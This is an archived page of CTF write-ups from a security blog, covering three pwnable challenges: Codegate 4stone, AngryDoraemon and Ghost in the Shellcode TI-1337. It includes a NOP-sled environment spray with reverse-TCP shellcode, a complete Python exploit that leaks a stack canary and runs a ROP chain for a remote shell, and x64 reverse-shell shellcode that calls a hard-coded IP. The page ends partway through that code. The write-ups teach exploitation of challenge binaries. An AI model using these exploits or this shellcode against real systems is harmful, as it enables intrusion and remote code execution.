@@ -1,0 +1,1165 @@
+
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>&lt;/pwntester&gt; - Page 4</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="../../assets/favicon.png?v=d47df0f104">
+
+    <link rel="stylesheet" type="text/css" href="../../assets/css/screen.css?v=d47df0f104">
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+
+    <script type="text/javascript" src="../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/moment.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/handlebars.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
+    <script type="text/javascript" src="../../assets/js/index.js?v=d47df0f104"></script>
+
+
+    <link rel="canonical" href="http://www.pwntester.com/page/4/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="prev" href="http://www.pwntester.com/page/3/">
+    <link rel="next" href="http://www.pwntester.com/page/5/">
+    <meta name="generator" content="Ghost 0.11">
+    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">
+
+    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../../assets/css/prism.css?v=d47df0f104">
+
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-49973078-2', 'pwntester.com');
+  ga('send', 'pageview');
+
+</script></head>
+
+<body class="paged archive-template">
+
+    <div id="sidebar">
+        <div id="sidebar-content" class="inner">
+            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
+            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
+            <h3 class="blog-description"></h3></h2>
+
+            <!--form id="search">
+                <input id="search-field" placeholder="Search"/>
+            </form-->
+            <form id="search">  
+                <input id="search-field" type="search" placeholder="Search">
+            </form>  
+
+            <div id="sidebar-links">
+                <ul id="subscription-links">
+                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
+                    <!-- No support yet
+                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
+                    -->
+                </ul>
+                <ul id="sidebar-internal">
+                    <!-- For 'About' and other pages -->
+                </ul>
+                <ul id="sidebar-external">
+                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
+<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
+<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
+<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
+                </ul>
+            </div>
+
+            <footer class="site-footer">
+                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
+            </footer>
+        </div>
+    </div>
+
+    <main>
+        <section id="results"></section>
+        
+
+
+<article class="post tag-pwnable tag-ctf82 tag-codegate83 tag-loader">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-03-23">23 Mar 2014</time> on <a href="../../tag/pwnable/">pwnable</a>, <a href="../../tag/ctf82/">ctf</a>, <a href="../../tag/codegate83/">codegate</a>, <a href="../../tag/loader/">loader</a></span>
+        <h1 class="post-title"><a href="../../blog/2014/03/23/codegate-2k14-4stone-pwnable-300-write-up/">Codegate 2k14 4stone (Pwnable 300) Write Up</a></h1>
+    </header>
+    <section class="post-content">
+        <p>In this level we are presented with a connect 4 game written with ncurses. After playing a couple of times we find a combination to win: <code>DHHDLLDHDDDLDD</code></p>
+
+<p><img src="../../content/images/octopress/4stone-6.png" alt="">
+<img src="../../content/images/octopress/4stone-4.png" alt=""></p>
+
+<p>Nothing happens though so lets fire up Hopper and take a look at the code. A good place to start is by analyzing the code around the <strong>you win</strong> and <strong>you lose</strong> exit strings and actually, after priting the <strong>you win</strong> string we can find an interesting piece of code before the call to <code>exit()</code></p>
+
+<p><img src="../../content/images/octopress/4stone-7.png" alt=""></p>
+
+<p>If we decompile we can easily read what the code is doing:</p>
+
+<p><img src="../../content/images/octopress/4stone-5.png" alt=""></p>
+
+<p>If we win in 0 seconds, and the number or arguments passed to the program is 2 (the program and a first argument), then the first argument is converted into an unsigned long and with gdb we can see that <code>scanf("%x", 0xbffffab8)</code> is called, so we are writing whatever hexadecimal value we receive in <strong>stdin</strong> as an unsigned integer(4 bytes) in the stack. Then the program checks if the value read starts with <code>0x0804xxxx</code> or <code>0xbxxxxxxx</code> and if thats not the case, the value read from the first argument is stored in the address got from the <strong>stdin</strong>. So basically we have a 4 bytes write to any <em>arbitrary</em> address not starting with those prefixes.</p>
+
+<p>Lets check it. First we need to prepare a file with the combo needed to win in 0 seconds and the value we want to write in memory:</p>
+
+<p><img src="../../content/images/octopress/4stone-8.png" alt=""></p>
+
+<p>Now we need to run the program with an argument pointing to an address outside the restricted areas. If we look into the process memory mapping, we see that only a tiny portion of the heap is outside those addresses:</p>
+
+<p><img src="../../content/images/octopress/4stone-9.png" alt=""></p>
+
+<p>We can increase it by augmenting the stack area running <code>ulimit -s unlimited</code> effectively disabling ASLR:</p>
+
+<p><img src="../../content/images/octopress/4stone-10.png" alt=""></p>
+
+<p>Much better, now the only protected memory area are the stack and the binary. Too bad we cannot overwrite `exit@GOT since its going to be called right after the arbitrary 4 bytes write.</p>
+
+<p>For now we are going to write <code>0x41414141</code> in <code>0x4001f000</code> that has write permissions to verify the vulnerability.</p>
+
+<p><code>exit()</code></p>
+
+<p>Pretty cool!! but useless ... so where and what to write??? The only code left to run is the call to <code>exit()</code> so we need a way to hijack that call and we cannot write to the <code>GOT</code>. Lets review what is going to happen when we reach the call to <code>exit()</code> and lets try to find a place to redirect the execution flow:</p>
+
+<ul>
+<li>The program calls <code>exit()</code> and jumps to <code>PLT</code></li>
+<li><code>PLT</code> jumps to the <code>GOT</code> but since the address has not being resolved yet, we jump to the dynamic loader to locate the address of <code>exit()</code> in libc and write the address to the <code>GOT</code> so we can effectively jump to the <code>exit()</code> code.</li>
+</ul>
+
+<p>In order to calculate the <code>exit()</code> address, the dynamic loader will check <code>libc</code> address and the offset of <code>exit()</code> in libc. If we can influence either the <strong>base</strong> or the <strong>offset</strong> we will be able to redirect the original call to any arbitrary location. If we are going to debug the dynamic loader, we better get ourselves some symbols.</p>
+
+<p><a href="http://dynofu.wikispaces.com/Tracing+Shared+Library+Call+Translation">We will need</a>:</p>
+
+<ul>
+<li>libc debug symbol: sudo apt-get install libc-dbg</li>
+<li>libc6 source: sudo apt-get source libc6*</li>
+</ul>
+
+<p>Don't know why but symbols for the loader need to be manually loaded. Adjust the <code>ld-linux</code> address and add these lines to a <code>gdb</code> script:</p>
+
+<p><code>scanf("%x", 0xbffffab8)</code></p>
+
+<p>Run gdb and check that <code>ld</code> symbols are loaded</p>
+
+<p><img src="../../content/images/octopress/4stone-11.png" alt=""></p>
+
+<p>We want to find out where the libc address or <code>exit</code> offset are stored so we can recognize them while tracing the loader resolution. These are the values we are looking for:</p>
+
+<p><img src="../../content/images/octopress/4stone-19.png" alt=""></p>
+
+<p>Ok, lets start the tracing. The first instruction in <code>ld-linux</code> is:</p>
+
+<p><img src="../../content/images/octopress/4stone-14.png" alt=""></p>
+
+<p>And look that, we even have comments!! ;) Ok, the <code>_dl_runtime_resolve</code> funcion doesn't look too scary:</p>
+
+<p><img src="../../content/images/octopress/4stone-15.png" alt=""></p>
+
+<p><code>_dl_fixup</code> is a different thing, but it has few calls and the second one to <code>_dl_lookup_symbol_x</code> looks promising.</p>
+
+<p><img src="../../content/images/octopress/4stone-16.png" alt=""></p>
+
+<p>As seen in the screenshot, right after the call <code>EAX</code> is updated with <code>0x40082000</code> which contains <code>0x40083000</code> the libc base address we were looking for. And if you go up to the process memory mapping, you will see that that address is writable!</p>
+
+<p>In this case we were lucky, the <code>libc</code> address pop up quite early, but I wrote this script to automate the task in case I had to trace deep in the loader guts:</p>
+
+<p><code>0x0804xxxx</code></p>
+
+<p>Running the tracer, we can quickly find the address where the libc base is stored:</p>
+
+<p><img src="../../content/images/octopress/4stone-20.png" alt=""></p>
+
+<p>OK, So <code>exit@GOT</code> is going to be updated with <code>libc_base + exit_offset</code>; we now control <code>libc</code> base, and we know the offset so if we want to redirect the execution flow, lets say that to <code>0x41414141</code> we have to overwrite the <code>libc</code> base address with <code>0x41414141 - 0xa1354 = 0x41372ded</code>. Let's try it, we will update the combo file with this value (so it is sent to the program via stdin) and call the executable with <code>0x40082000</code> as argument.</p>
+
+<p><img src="../../content/images/octopress/4stone-17.png" alt=""></p>
+
+<p>Sweet, we now control <code>EIP</code>!! But where should we jump?? We dont control any area in the stack and we cannot pass more arguments to the program, so the only thing we can do is a Environment variable Spray with a large NOP sled and a shellcode and then jump to a high address (<code>0xbff00000 + 0xa1354</code>) of the stack hoping to land in the NOP sled.</p>
+
+<p>Shellcode: reverse TCP connection to port 4444 on local machine:</p>
+
+<p><img src="../../content/images/octopress/4stone-3.png" alt=""></p>
+
+<p>Environment Spray:</p>
+
+<pre><code class="language-lang-bash line-numbers ">for i in $(seq 1 1024); do export payload$i="`python -c "print '\x90'*2048+'\xbf\xdd\xc9\xc5\xd6\xd9\xc5\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x12\x83\xc0\x04\x31\x78\x0e\x03\xa5\xc7\x27\x23\x64\x03\x50\x2f\xd5\xf0\xcc\xda\xdb\x7f\x13\xaa\xbd\xb2\x54\x58\x18\xfd\x6a\x92\x1a\xb4\xed\xd5\x72\x38\x0e\x26\x83\xae\x0c\x26\x92\x72\x98\xc7\x24\xec\xca\x56\x17\x42\xe9\xd1\x76\x69\x6e\xb3\x10\x5d\x40\x47\x88\xc9\xb1\xc5\x21\x64\x47\xea\xe3\x2b\xde\x0c\xb3\xc7\x2d\x4e'"`"; done  
+</code></pre>
+
+<p>Failed attempt:</p>
+
+<p><img src="../../content/images/octopress/4stone-1.png" alt=""></p>
+
+<p>aaaaand we got our shell:</p>
+
+<p><img src="../../content/images/octopress/4stone-2.png" alt=""></p>
+
+<p>Voila!!</p>
+    </section>
+    <footer class="post-indexfooter">
+        <i class="fa fa-comments"></i> <a href="../../blog/2014/03/23/codegate-2k14-4stone-pwnable-300-write-up/index.html#disqus_thread">Comments</a>
+    </footer>
+</article>
+
+
+<article class="post tag-pwnable tag-aslr tag-nx tag-leak">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-03-21">21 Mar 2014</time> on <a href="../../tag/pwnable/">pwnable</a>, <a href="../../tag/aslr/">aslr</a>, <a href="../../tag/nx/">nx</a>, <a href="../../tag/leak/">leak</a></span>
+        <h1 class="post-title"><a href="../../blog/2014/03/21/codegate-2k14-angrydoraemon-pwnable-250-write-up/">Codegate 2k14 AngryDoraemon (pwnable 250) write up</a></h1>
+    </header>
+    <section class="post-content">
+        <p>This is an easy pwnable level but very interesting since there are many ways to exploit it so lets start checking the binary protections:</p>
+
+<p><img src="../../content/images/octopress/angrybird-1.png" alt=""></p>
+
+<p>Not bad, ASLR and NX enabled and the stack is protected with a Canary. Lets analyze what does it do ... Running the binary opens a socket in port 8888 which we can connect to and receive a menu with options to attack Doraemon:</p>
+
+<p><img src="../../content/images/octopress/angrybird-2.png" alt=""></p>
+
+<p>Normally I play with the binary and try to get a crash which is simple in this case, but this time I decided to do some Reversing that payed off very well, I found the following vulnerabilities:</p>
+
+<ul>
+<li>First Attack -&gt; right attack: Allows us to enter any 4 bytes and call that address.
+<ul><li>{% img center /images/angrybird-4.png %}</li></ul></li>
+<li>Sword options leads to a portion of code that executes a shell :) However we cannot intereact with it :(
+<ul><li>{% img center /images/angrybird-3.png %}</li></ul></li>
+<li>Mouse attack -&gt; are you sure? contains a buffer overflow, but the stack is protected with the canary
+<ul><li>{% img center /images/angrybird-12.png %}</li>
+<li>However we still get some output in the client:</li>
+<li>{% img center /images/angrybird-5.png %}</li></ul></li>
+</ul>
+
+<p>That last vulnerability is interesting! not only allow us to influence EIP but also leak some bytes from memory! Lets see how it works. If we send yAAAA we get the following stack right before the "ret":</p>
+
+<p><img src="../../content/images/octopress/angrybird-6.png" alt=""></p>
+
+<p>We can see that ESP points to 0x0840492c5 that is the saved EIP, the dword before is the saved EBP and the one in 0xbffff95c is the canary (starting with a \x00). When the program prints "You choose xxxx" its printing a null terminated string starting at 0xbffff952</p>
+
+<p><img src="../../content/images/octopress/angrybird-7.png" alt=""></p>
+
+<p>This is really close to our canary so if we send some more As we can extend the string so it includes the bytes in the canary. Since it contains a null byte at the beggining, we have to overwrite it too so the strings get extended until next null. We need "y" + 10 "A"s. Actually, we can even include the saved EBP in the leak so we can use it as a reference to point to items in the stack. Cool!</p>
+
+<p>Lets write a small script to leak the canary and EBP:</p>
+
+<pre><code class="language-lang-python line-numbers ">def get_canary(ip, port):  
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    print("[+] Wating for menu")
+    time.sleep(3)
+    # Receive menu
+    s.recv(1024)
+    s.send("4\n")
+    time.sleep(1)
+    print("[+] Sending mouse trap")
+    payload = "y" + "A"*9 + "\n"
+    s.send(payload)
+    # Receive "are you sure?"
+    message = s.recv(60)
+    # Receive canary
+    message = s.recv(60)
+    canary_group = re.match(".*yAAAAAAAAA\n(.*)'!.*", message)
+    canary = struct.unpack("&lt;I", "\x00" + canary_group.group(1)[:3])[0]
+    ebp = struct.unpack("&lt;I", canary_group.group(1)[11:15])[0]
+    eip = struct.unpack("&lt;I", canary_group.group(1)[15:19])[0]
+    print "[+] Got canary %#x" % canary
+    print "[+] Got saved ebp %#x" % ebp
+    print "[+] Got saved eip %#x" % eip
+    s.close()
+    return (canary, ebp, eip)
+</code></pre>
+
+<p><img src="../../content/images/octopress/angrybird-8.png" alt=""></p>
+
+<p>Ok, now that we know the canary we can use it to influence EIP without firing all the alarms. Since the stack is not executable we will need a ROP chain to get code execution. My idea is to redirect stdin, stdout and stderr to the opened socket and then redirect the code flow to the original call to execl("/bin/sh") present in the code. But since the system has ASLR enabled we need to leak a libc address to calculate <strong>dup2</strong> address.</p>
+
+<p>Since the PLT contains interesting functions like read or write, we can interact with the application. For example we can use the ROP chain to call <strong>write</strong> and send any number of bytes to the socket, even the whole binary (interesting for Blind ROP techniques). What content are we interested in? what about a resolved address in the GOT so we can leak a libc function address? That way and since the offsets will be constant, we can calculate any function address in libc. This is the script to leak any address from the GOT:</p>
+
+<pre><code class="language-lang-python line-numbers ">def leak_address(ip, port, canary, ebp, address, socketfd):  
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.connect((ip, port))
+    print("[+] Reconnecting")
+    time.sleep(3)
+    # Receive menu
+    ss.recv(1024)
+    ss.send("4\n")
+    time.sleep(1)
+    # Receive "are you sure?"
+    ss.recv(60)
+    print("[+] Sending leakage payload")
+    leak_payload = ["y"*10,
+                p(canary),
+                "B"*8,
+                p(ebp),
+                p(0x080486e0), # write@plt
+                p(0x41414141), # exit
+                p(socketfd),  # socket fd
+                p(address),  # write@got: address to read write@libc from
+                p(4), # bytes to read
+                "\n"]
+
+    leak_payload = "".join(leak_payload)
+    ss.send(leak_payload)
+    leak = ss.recv(4)
+    ss.close()
+    return struct.unpack("&lt;I", leak)[0]
+</code></pre>
+
+<p>In this case we use a ROP chain that calls "write" and reads 4 bytes from the GOT offset where write@libc is stored and send it to the socket fd.</p>
+
+<p><img src="../../content/images/octopress/angrybird-9.png" alt=""></p>
+
+<p>Now lets find out the offset between "write" and "dup2" in libc:</p>
+
+<p><img src="../../content/images/octopress/angrybird-10.png" alt=""></p>
+
+<p>Cool, so we now can call <strong>dup2</strong> to redirect the standard output and input to the socket, run our shell and interact with it. The payload looks like:</p>
+
+<pre><code class="language-lang-python line-numbers ">(canary, ebp, eip) = get_canary(ip, port)
+
+write_addr = leak_address(ip, port, canary, ebp, 0x804b040, socketfd)
+
+dup2_write_offset = 0x7d0  
+dup2_addr = write_addr + dup2_write_offset
+
+print "[+] Leaked write address %#x" % write_addr  
+print "[+] Got dup2 address %#x" % dup2_addr
+
+payload =   ["A"*10,  
+            p(canary),
+            "B"*8,
+            p(ebp),
+            p(dup2_addr),
+            p(0x080495be), # pop, pop, ret
+            p(socketfd),  # fd 4
+            p(0),  # fd 0
+            p(dup2_addr),
+            p(0x080495be), # pop, pop, ret
+            p(socketfd),  # fd 4
+            p(1),  # fd 1
+            p(dup2_addr),
+            p(0x080495be), # pop, pop, ret
+            p(socketfd),  # fd 4
+            p(2),  # fd 2
+            p(0x08048c62), # call execl("/bin/sh")
+            "\n"]
+</code></pre>
+
+<p>We basically call dup2 three times to redirect stdin, stdout and stderr to the socket and then we return to 0x08048c62 where there is a call to execl("/bin/sh"). Convenient, right? Now all we have to do is interact with the shell via the socket:</p>
+
+<pre><code class="language-lang-python line-numbers ">print "[+] Shell is waiting ..."  
+while True:  
+    sys.stdout.write("$ ")
+    sys.stdout.flush()
+    c = sys.stdin.readline()
+    s.send(c)
+    time.sleep(0.5)
+    print s.recv(4095)
+</code></pre>
+
+<p><img src="../../content/images/octopress/angrybird-11.png" alt=""></p>
+
+<p>Voila!</p>
+
+<p>Full exploit:</p>
+
+<pre><code class="language-lang-python line-numbers ">import socket  
+import struct  
+import time  
+import sys  
+import re
+
+def get_canary(ip, port):  
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    print("[+] Wating for menu")
+    time.sleep(3)
+    # Receive menu
+    s.recv(1024)
+    s.send("4\n")
+    time.sleep(1)
+    print("[+] Sending mouse trap")
+    payload = "y" + "A"*9 + "\n"
+    s.send(payload)
+    # Receive "are you sure?"
+    message = s.recv(60)
+    # Receive canary
+    message = s.recv(60)
+    canary_group = re.match(".*yAAAAAAAAA\n(.*)'!.*", message)
+    canary = struct.unpack("&lt;I", "\x00" + canary_group.group(1)[:3])[0]
+    ebp = struct.unpack("&lt;I", canary_group.group(1)[11:15])[0]
+    eip = struct.unpack("&lt;I", canary_group.group(1)[15:19])[0]
+    print "[+] Got canary %#x" % canary
+    print "[+] Got saved ebp %#x" % ebp
+    print "[+] Got saved eip %#x" % eip
+    s.close()
+    return (canary, ebp, eip)
+
+def leak_address(ip, port, canary, ebp, address, socketfd):  
+    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ss.connect((ip, port))
+    print("[+] Reconnecting")
+    time.sleep(3)
+    # Receive menu
+    ss.recv(1024)
+    ss.send("4\n")
+    time.sleep(1)
+    # Receive "are you sure?"
+    ss.recv(60)
+    print("[+] Sending leakage payload")
+    leak_payload = ["y"*10,
+                p(canary),
+                "B"*8,
+                p(ebp),
+                p(0x080486e0), # write@plt
+                p(0x41414141), # exit
+                p(socketfd),  # socket fd
+                p(address),  # write@got: address to read write@libc from
+                p(4), # bytes to read
+                "\n"]
+
+    leak_payload = "".join(leak_payload)
+    ss.send(leak_payload)
+    leak = ss.recv(4)
+    ss.close()
+    return struct.unpack("&lt;I", leak)[0]
+
+def ask_for_key():  
+    print "[+] Now change gdb affinity and press any key"
+    input = raw_input()
+
+def send_mouse_attack(s, payload):  
+    print("[+] Reconnecting")
+    time.sleep(3)
+    # Receive menu
+    s.recv(1024)
+    s.send("4\n")
+    time.sleep(1)
+    # Receive are you sure?
+    s.recv(1024)
+    print("[+] Sending payload")
+    s.send(payload)
+
+def p(addr):  
+    return struct.pack("&lt;I", addr)
+
+
+if __name__ == "__main__":  
+    ip = '127.0.0.1'
+    port = 8888
+    socketfd = 4
+
+    (canary, ebp, eip) = get_canary(ip, port)
+
+    write_addr = leak_address(ip, port, canary, ebp, 0x804b040, socketfd)
+
+    dup2_write_offset = 0x7d0
+    dup2_addr = write_addr + dup2_write_offset
+
+    print "[+] Leaked write address %#x" % write_addr
+    print "[+] Got dup2 address %#x" % dup2_addr
+
+    payload =   ["A"*10,
+                p(canary),
+                "B"*8,
+                p(ebp),
+                p(dup2_addr),
+                p(0x080495be), # pop, pop, ret
+                p(socketfd),  # fd 4
+                p(0),  # fd 0
+                p(dup2_addr),
+                p(0x080495be), # pop, pop, ret
+                p(socketfd),  # fd 4
+                p(1),  # fd 1
+                p(dup2_addr),
+                p(0x080495be), # pop, pop, ret
+                p(socketfd),  # fd 4
+                p(2),  # fd 2
+                p(0x08048c62), # call execl("/bin/sh")
+                "\n"]
+
+    payload = "".join(payload)
+    #ask_for_key()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    send_mouse_attack(s, payload)
+    time.sleep(1)
+
+    print "[+] Shell is waiting ..."
+    while True:
+        sys.stdout.write("$ ")
+        sys.stdout.flush()
+        c = sys.stdin.readline()
+        s.send(c)
+        time.sleep(0.5)
+        print s.recv(4095)
+
+    s.close()
+</code></pre>
+    </section>
+    <footer class="post-indexfooter">
+        <i class="fa fa-comments"></i> <a href="../../blog/2014/03/21/codegate-2k14-angrydoraemon-pwnable-250-write-up/index.html#disqus_thread">Comments</a>
+    </footer>
+</article>
+
+
+<article class="post tag-ctf tag-pwnable">
+    <header class="post-header">
+        <span class="post-meta"><time datetime="2014-03-15">15 Mar 2014</time> on <a href="../../tag/ctf/">CTF</a>, <a href="../../tag/pwnable/">pwnable</a></span>
+        <h1 class="post-title"><a href="../../blog/2014/03/15/ghost-in-the-shellcode-ti-1337-pwnable/">Ghost in the Shellcode: TI-1337 Pwnable</a></h1>
+    </header>
+    <section class="post-content">
+        <p>In this level we were presented with an ELF 64bits executable, a good oportunity to exercise linux exploiting on 64bits systems and try Hopper for the first time :)</p>
+
+<p>When you run the binary, it begins listening in port 31415 (pi!) but if we try to connect, it complains about a missing user "gambino". So we have to create the user. Once created, if we try to connect to the service we get nothing. We can send arbitrary data and if we send strings we get a "Unknown op 'your string here'" error, so it seems like its waiting for commands. Sending numbers dont return any errors.</p>
+
+<p>Since its a network service, we can assume its using fork to spawn new process to attend the incoming requests. We will be using Hopper to dissasamble and revere the binary. So first thing to do is find if there is a fork and of so replace it with a NOP instruction that also sets RAX to 0 so the program can continue as if it was the child process.</p>
+
+<p>fork() call can be found at 0x0000000000400f65 (E8 06 FD FF FF) and if you dont want to be setting gdb to follow child processes, you can use an hex editor to replace it with xor eax,eax; nop; nop; nop (31 c0 90 90 90) as suggested in this <a href="https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100">post</a></p>
+
+<p>If the fork goes ok, the child runs this code that uses "call rax" to jump to the main routine. I used gdb to find out the value of rax at that point that turns out to be 0x401567</p>
+
+<p><img src="../../content/images/octopress/gits100-1.png" alt=""></p>
+
+<p>The first thing it does here is calling a function (sub<em>401395) that we will rename to receive</em>command since thats exactly what it does. When it receives data, it stores it in a buffer of 256 bytes that we cannot overflow. When it receives a line terminator (0x0a), it scans the value using sscanf and "%lg" as the format string which stands for a double (number with up to six digits of precision). If the scan is successful the value is stored in an structure along with a 0x1 to indicate its a double value. Any other non numeric value is stored in the same structure but using 0x2 to indicate it was not a number.</p>
+
+<p>Back in the main routine, it checks the structure returned and if it was numeric it calls a function (sub_40149f) that copies the value in a memory area that behaves like a stack, growing to higher memory values. This stack stores the total number of items stored in the first qword followed by a null qword and then the stored items:</p>
+
+<pre><code class="language-lang-bash line-numbers ">gdb-peda$ x/64x $rdx  
+0x603140:   0x0000000000000001  0x0000000000000000   &lt;- Beggining of the stack (# items - 0x0)  
+0x603150:   0x3ff0000000000000  0x0000000000000000   &lt;- (1st item - not used yet)  
+0x603160:   0x0000000000000000  0x0000000000000000   &lt;- (not used yet - not used yet)  
+</code></pre>
+
+<p>If the command sent was not numeric, it uses a jump table (switch) to process the operand. If the command received is bigger than 0x71 = ‘q’ it quits with a "non valid op" error. If its between 0x0 and 0x50 it uses the jump table that after an initial analysis seems to be waiting for the following commands: +,-,*,/,^,!,b,c,.</p>
+
+<p>This looks like a calculator so we try to send some operations and find out what these commands are used for. It turns out to be a reverse notation calculator where you first enter the values and then the operand. This is the meaning of the following operands:</p>
+
+<ul>
+<li>+: Adds the two values on the top of the stack</li>
+<li>-: Same but substracts</li>
+<li>*: Multiply</li>
+<li>/: Division</li>
+<li>!: ¿?¿?</li>
+<li>^: power</li>
+<li>b: pops a value from the stack and prints the value</li>
+<li>c: clear the stack, moves the stack pointer to the beggining of the stack and initialize the counter but does not erase stored values.</li>
+<li>.: prints the value on the top of the stack</li>
+</ul>
+
+<p><img src="../../content/images/octopress/gits100-2.png" alt=""></p>
+
+<p>Note that Hopper cannot reverse the jump table correctly.</p>
+
+<p>Ok, so the vulnerability here is that "b" pop items from the calculator stack but does not check if it reaches the bottom. So we can pop as many values as we want and then send doubles that will be stored in any memory location before the calculator stack. And what do we have there??</p>
+
+<pre><code class="language-lang-bash line-numbers ">gdb-peda$ x/64x $rdx - 256  
+0x603040 &lt;strlen@got.plt&gt;:  0x0000000000400b16  0x00007ffff78a0250  
+0x603050 &lt;htons@got.plt&gt;:   0x00007ffff78c1b90  0x0000000000400b46  
+0x603060 &lt;htonl@got.plt&gt;:   0x00007ffff78c1b80  0x00007ffff78546d0  
+0x603070 &lt;pow@got.plt&gt;: 0x0000000000400b76  0x0000000000400b86  
+0x603080 &lt;close@got.plt&gt;:   0x00007ffff789fa20  0x00007ffff7879df0  
+0x603090 &lt;__libc_start_main@got.plt&gt;:   0x00007ffff77efdb0  0x00007ffff7803380  
+0x6030a0 &lt;getpwnam@got.plt&gt;:    0x00007ffff787b670  0x0000000000400be6  
+0x6030b0 &lt;err@got.plt&gt;: 0x0000000000400bf6  0x00007ffff7828fd0  
+0x6030c0 &lt;listen@got.plt&gt;:  0x00007ffff78ac820  0x00007ffff78ac700  
+0x6030d0 &lt;setgid@got.plt&gt;:  0x00007ffff787db90  0x00007ffff78ac6a0  
+0x6030e0 &lt;exit@got.plt&gt;:    0x0000000000400c56  0x00007ffff787db30  
+0x6030f0 &lt;fork@got.plt&gt;:    0x0000000000400c76  0x00007ffff78acbb0  
+0x603100:   0x0000000000000000  0x0000000000000000  
+0x603110:   0x0000000000007ab7  0x0000000000401a10  
+0x603120:   0x0000000000000000  0x0000000000000000  
+0x603130:   0x0000000000000000  0x0000000000000000  
+0x603140:   0x0000000000000001  0x0000000000000000   &lt;- Beggining of the stack (# items - 0x0)  
+0x603150:   0x3ff0000000000000  0x0000000000000000   &lt;- (1st item - not used yet)  
+0x603160:   0x0000000000000000  0x0000000000000000   &lt;- (not used yet - not used yet)  
+</code></pre>
+
+<p>The GOT!!!! So we can overwrite any entry in the GOT so that when that function gets called, the program flow will jump to the address we can set there. So we can store our shellcode in the calculator stack and then clear it (not erasing the shellcode) and then pop 38 items so that next value we send will effectively overwrite the GOT entry for recv() with the address of the begining of our shellcode. Next call to recv() will be replaced with a call to our shellcode. Only problem here is that we need to send doubles and account for how they are going to be stored in memory. I couldnt get it working in python (struct.unpack("d", value)) since the precision was not accurate and I couldnt control the values to be written in the stack, so I borrowed the converter used in this <a href="https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100">post</a> .... yep, I cheated, damn python!</p>
+
+<p>Using that converter:</p>
+
+<pre><code class="language-lang-clike line-numbers ">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, const char *argv[]) {
+
+        /* The address and port for the shellcode */
+        #define SCPORT "\x41\x41" /* 16705 */
+        #define SCIPADDR "\xc0\xa8\xef\x90" /* 192.168.239.144 */
+
+        /* The shellcode */
+        char shellcode[] =
+          "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
+          "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
+          "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
+          "\x02"SCPORT"\xc7\x44\x24\x04"SCIPADDR"\x48\x89\xe6\x6a\x10"
+          "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
+          "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
+          "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
+          "\x5f\x6a\x3b\x58\x0f\x05"
+          /* End with a bunch of NOPs to make sure it's a multiple of 8 */
+          "\x90\x90\x90\x90\x90\x90\x90\x90";
+
+
+        int i;
+        for(i = 0; i &lt; strlen(shellcode); i += 8) {
+          char buf[1024];
+          double d;
+
+          /* Convert the value to a double */
+          memcpy(&amp;d, shellcode + i, 8);
+
+          /* Turn the double into a string */
